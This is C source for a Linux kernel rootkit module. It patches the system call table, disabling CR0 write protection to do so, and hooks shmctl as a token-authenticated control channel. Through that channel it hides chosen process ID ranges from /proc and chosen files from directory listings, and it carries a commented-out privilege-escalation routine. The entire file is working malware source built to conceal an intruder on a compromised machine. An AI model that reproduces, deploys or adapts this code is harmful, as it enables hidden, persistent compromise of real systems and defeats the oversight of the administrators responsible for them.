#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/slab.h>
#include <linux/list.h>
#include <linux/fs.h>
#include <linux/cred.h>
#include <linux/shm.h>
#include <asm/uaccess.h>
#include <asm/unistd.h>
#include <asm/processor.h>
#include <linux/delay.h>

#define AUTH_TOKEN  0x77617363
#define MAX_PIDS    100
#define MAX_FILES   100

#define DEBUG if ( debug ) printk

long debug = 0;

struct pid_args {
    long pid_start;
    long pid_end;
};

struct file_args {
    char *name;
    int len;
};

struct {
    unsigned short limit;
    unsigned long base;
} __attribute__ ((packed))idtr;

struct {
    unsigned short off1;
    unsigned short sel;
    unsigned char none, flags;
    unsigned short off2;
} __attribute__ ((packed))idt;

unsigned long *sys_call_table;

struct hidden_pid {
    long pid_start;
    long pid_end;
    struct list_head list;
};

LIST_HEAD(hidden_pids);

struct hidden_file {
    void (*cb)(struct hidden_file *);
    char *name;
    struct list_head list;
};

LIST_HEAD(hidden_files);

static int (*orig_sys_shmctl)(int, int, void *);
static int (*orig_proc_iterate)(struct file *, struct dir_context *);
static int (*proc_filldir)(void *, const char *, int, loff_t, u64, unsigned);
static int (*orig_root_iterate)(struct file *file, struct dir_context *);
static int (*root_filldir)(void *__buf, const char *name, int namelen, loff_t offset, u64 ino, unsigned d_type);

void *memmem ( const void *haystack, size_t haystack_size, const void *needle, size_t needle_size )
{
    char *p;

    for ( p = (char *)haystack; p <= ((char *)haystack - needle_size + haystack_size); p++ )
        if ( memcmp(p, needle, needle_size) == 0 )
            return (void *)p;

    return NULL;
}

// http://bbs.chinaunix.net/thread-2143235-1-1.html
unsigned long *find_sys_call_table ( void )
{
    char **p;
    unsigned long sct_off = 0;
    unsigned char code[512];

    rdmsrl(MSR_LSTAR, sct_off);
    memcpy(code, (void *)sct_off, sizeof(code));

    p = (char **)memmem(code, sizeof(code), "\xff\x14\xc5", 3);

    if ( p )
    {
        unsigned long *sct = *(unsigned long **)((char *)p + 3);

        // Stupid compiler doesn't want to do bitwise math on pointers
        sct = (unsigned long *)(((unsigned long)sct & 0xffffffff) | 0xffffffff00000000);

        return sct;
    }
    else
        return NULL;
}

// Thanks Dan
inline unsigned long disable_wp ( void )
{
    unsigned long cr0;

    preempt_disable();
    barrier();

    cr0 = read_cr0();
    write_cr0(cr0 & ~X86_CR0_WP);
    return cr0;
}

inline void restore_wp ( unsigned long cr0 )
{
    write_cr0(cr0);

    barrier();
    preempt_enable();
}

void write_ulong ( unsigned long *ptr, unsigned long val )
{
    unsigned long o_cr0 = disable_wp();
    *ptr = val;
    restore_wp(o_cr0);
}

unsigned long xchg_ulong ( unsigned long *ptr, unsigned long val )
{
    unsigned long ret, o_cr0 = disable_wp();
    ret = __sync_lock_test_and_set(ptr, val);
    restore_wp(o_cr0);

    return ret;
}

void debug_hidden_file ( struct hidden_file *hf )
{
    DEBUG("Hiding file %s from directory listing\n", hf->name);
}

void suckerusu_kfree ( void *objp )
{
    DEBUG("Freeing buffer at %p\n", objp);

    kfree(objp);
}

void *suckerusu_kmalloc ( size_t size, gfp_t flags )
{
    void *ptr;

    ptr = kmalloc(size, flags);

    DEBUG("Allocating buffer at %p\n", ptr);

    return ptr;
}

void hide_pid ( long pid_start, long pid_end )
{
    struct hidden_pid *hp;

    hp = suckerusu_kmalloc(sizeof(*hp), GFP_KERNEL);
    if ( ! hp )
        return;

    hp->pid_start = pid_start;
    hp->pid_end = pid_end;

    list_add(&hp->list, &hidden_pids);
}

void unhide_pid ( long pid_start, long pid_end )
{
    struct hidden_pid *hp;

    list_for_each_entry ( hp, &hidden_pids, list )
    {
        if ( (pid_start == hp->pid_start) && (pid_end == hp->pid_end) )
        {
            list_del(&hp->list);
            suckerusu_kfree(hp);
            break;
        }
    }
}

void hide_file ( char *name )
{
    struct hidden_file *hf;

    hf = suckerusu_kmalloc(sizeof(*hf), GFP_KERNEL);
    if ( ! hf )
        return;

    hf->name = name;
    hf->cb = debug_hidden_file;

    list_add(&hf->list, &hidden_files);
}

void unhide_file ( char *name )
{
    struct hidden_file *hf;

    list_for_each_entry ( hf, &hidden_files, list )
    {
        if ( ! strcmp(name, hf->name) )
        {
            suckerusu_kfree(hf->name);
            suckerusu_kfree(hf);
            break;
        }
    }
}

void *hook_vfs_iterate ( const char *path, void *hook_func )
{
    void *ret;
    int (* const *tmp)(struct file *, struct dir_context *);
    struct file *filep;

    if ( (filep = filp_open(path, O_RDONLY, 0)) == NULL )
        return NULL;

    tmp = &(filep->f_op->iterate);
    ret = (void *)xchg_ulong((unsigned long *)tmp, (unsigned long)hook_func);

    filp_close(filep, 0);

    return ret;
}

static int hook_proc_filldir( void *__buf, const char *name, int namelen, loff_t offset, u64 ino, unsigned d_type )
{
    struct hidden_pid *hp;
    char *endp;
    long pid;

    DEBUG("%s: enter, name=%s\n", __func__, name);

    pid = simple_strtol(name, &endp, 10);

    list_for_each_entry ( hp, &hidden_pids, list )
    {
        DEBUG("Checking name against: %ld-%ld\n", hp->pid_start, hp->pid_end);

        if ( (pid >= hp->pid_start) && (pid <= hp->pid_end) )
            return 0;
    }

    return proc_filldir(__buf, name, namelen, offset, ino, d_type);
}

int hook_proc_iterate ( struct file *file, struct dir_context *ctx )
{
    int ret;

    proc_filldir = ctx->actor;
    *((filldir_t *)&ctx->actor) = hook_proc_filldir;
    ret = orig_proc_iterate(file, ctx);

    return ret;
}

static int hook_root_filldir( void *__buf, const char *name, int namelen, loff_t offset, u64 ino, unsigned d_type )
{
    struct hidden_file *hf;

    DEBUG("%s: enter, name=%s\n", __func__, name);

    list_for_each_entry ( hf, &hidden_files, list )
    {
        DEBUG("Checking name against: '%s' with callback %p\n", hf->name, hf->cb);

        if ( strstr(name, hf->name) )
        {
            DEBUG("Match!\n");

            if ( hf->cb )
                hf->cb(hf);

            return 0;
        }
    }

    DEBUG("%s: end\n", __func__);

    return root_filldir(__buf, name, namelen, offset, ino, d_type);
}

int hook_root_iterate ( struct file *file, struct dir_context *ctx )
{
    int ret;

    root_filldir = ctx->actor;
    *((filldir_t *)&ctx->actor) = hook_root_filldir;
    ret = orig_root_iterate(file, ctx);

    return ret;
}

void gimme_root ( void )
{
    commit_creds(prepare_kernel_cred(NULL));
}

int hook_sys_shmctl ( int shmid, int cmd, struct shmid_ds *buf )
{
    /* This is the good stuff */
    if ( shmid == AUTH_TOKEN )
    {
        int ret = 0;

        DEBUG("Authenticated!\n");

        switch ( cmd )
        {
            /* Elevate privileges to root */
            case 0:
            {
                //gimme_root();
                break;
            }

            /* Hide process */
            case 1:
            {
                struct pid_args pid_args;

                DEBUG("Hiding process\n");

                if ( copy_from_user(&pid_args, buf, sizeof(pid_args)) )
                    return -EFAULT;

                hide_pid(pid_args.pid_start, pid_args.pid_end);
                break;
            }

            /* Unhide process */
            case 2:
            {
                struct pid_args pid_args;

                DEBUG("Unhiding process\n");

                if ( copy_from_user(&pid_args, buf, sizeof(pid_args)) )
                    return -EFAULT;

                unhide_pid(pid_args.pid_start, pid_args.pid_end);
                break;
            }

            /* Hide file */
            case 3:
            {
                char *name;
                struct file_args file_args;

                DEBUG("Hiding file\n");

                if ( copy_from_user(&file_args, buf, sizeof(file_args)) )
                    return -EFAULT;

                name = suckerusu_kmalloc(file_args.len + 1, GFP_KERNEL);
                if ( ZERO_OR_NULL_PTR(name) )
                    return -ENOMEM;

                ret = copy_from_user(name, file_args.name, file_args.len);
                if ( ret )
                {
                    suckerusu_kfree(name);
                    return -EFAULT;
                }

                name[file_args.len] = 0;

                hide_file(name);
                break;
            }

            /* Unhide file */
            case 4:
            {
                char *name;
                struct file_args file_args;

                DEBUG("Unhiding file\n");

                if ( copy_from_user(&file_args, buf, sizeof(file_args)) )
                    return -EFAULT;

                name = suckerusu_kmalloc(file_args.len + 1, GFP_KERNEL);
                if ( ZERO_OR_NULL_PTR(name) )
                    return -ENOMEM;

                ret = copy_from_user(name, file_args.name, file_args.len);
                if ( ret )
                {
                    suckerusu_kfree(name);
                    return -EFAULT;
                }

                name[file_args.len] = 0;

                unhide_file(name);
                break;
            }

            /* Toggle debugging */
            case 5:
            {
                debug = (long)buf;

                DEBUG("Debugging set to: %ld\n", debug);
            }
        }

        return ret;
    }

    return orig_sys_shmctl(shmid, cmd, (void *)buf);
}

static int __init i_solemnly_swear_that_i_am_up_to_no_good ( void )
{
    /* Find system call table */
    sys_call_table = find_sys_call_table();

    /* Install channel for communication with the rootkit */
    orig_sys_shmctl = *(void **)(sys_call_table + __NR_shmctl);
    write_ulong(sys_call_table + __NR_shmctl, (unsigned long)&hook_sys_shmctl);

    /* Hook /proc for hiding processes */
    orig_proc_iterate = hook_vfs_iterate("/proc", &hook_proc_iterate);

    /* Hook / for hiding files */
    orig_root_iterate = hook_vfs_iterate("/", &hook_root_iterate);

    return 0;
}

static void __exit mischief_managed ( void )
{
    // lol
}

module_init(i_solemnly_swear_that_i_am_up_to_no_good);
module_exit(mischief_managed);

MODULE_LICENSE("GPL");
